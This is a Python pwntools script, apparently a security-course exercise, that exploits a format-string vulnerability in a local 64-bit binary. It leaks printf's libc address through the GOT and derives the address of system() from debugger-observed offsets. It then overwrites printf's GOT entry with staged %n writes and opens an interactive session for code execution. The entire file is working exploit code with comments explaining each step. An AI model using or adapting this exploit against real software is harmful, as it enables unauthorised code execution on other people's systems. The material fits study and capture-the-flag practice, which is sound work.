#!/usr/bin/env python

from pwn import *
import os

env = {
        "PATH": "/home/users/didnera/week6/d-fs-code-exec-64"
        }

'''
context.terminal = ['tmux','splitw', '-h']
p = process('./gs-code-exec-64')
gdb.attach(p)
raw_input()
'''

p = process("./fs-code-exec-64", env = env)

print(p.recv(timeout= 0.1))

#AAAA%7$p -> is 7th argument (as input)
#Set break point point at printf call,
#x/x esp, value has our input
#x/20x $esp, then count





#arb read
#GOT of printf
got_of_printf = p.elf.got["printf"] + 1

#print(hex(got_of_printf))
#p.sendline("ABCDABCD" + "%6$p")

p.sendline(("%7$sAAAA" + p64(got_of_printf)))


data = p.recv(timeout=0.1)


libc_printf = data[6:11]
libc_printf = "\x00"+libc_printf + "\x00\x00"

libc_printf = u64(libc_printf)


print(repr(data))

print(hex(libc_printf))

'''
pwndbg> print system
$1 = {<text variable, no debug info>} 0x7f43ac375390 <__libc_system>
pwndbg> print printf
$2 = {<text variable, no debug info>} 0x7f43ac385800 <__printf>
'''


libc_system = libc_printf - 0x7f43ac385800 + 0x7f43ac375390

print("")
print("libc_system")
print(hex(libc_system))



lower = libc_system & 0xffff
print("first: " + hex(lower))
mid = ((libc_system >> 16) & 0xffff)
print("second: " + hex(mid))
upper = ((libc_system >> 32) & 0xffff)
print("third: " + hex(upper))

first = lower

second = mid - lower

while second < 0:
    second += 0x10000

third = upper - mid

while third < 0:
    third += 0x10000

fourth = 0x10000 - upper

print("1: "+ hex(first))
print("2: " + hex(second))
print("3: " + hex(third))
print("4: " + hex(fourth))


got_of_printf -= 1

buf  = "%" + "%05d" % first + "x"
buf += "%12$n"
buf += "%" + "%05d" % second + "x"
buf += "%13$n"
buf += "%"+ "%05d" % third + "x"
buf += "%14$n"
buf += "%" + "%05d" % fourth + "x"
buf += "%15$n"
buf += p64(got_of_printf) + p64(got_of_printf + 2) + p64(got_of_printf + 4) + p64(got_of_printf + 6)




p.sendline(buf)


p.interactive()
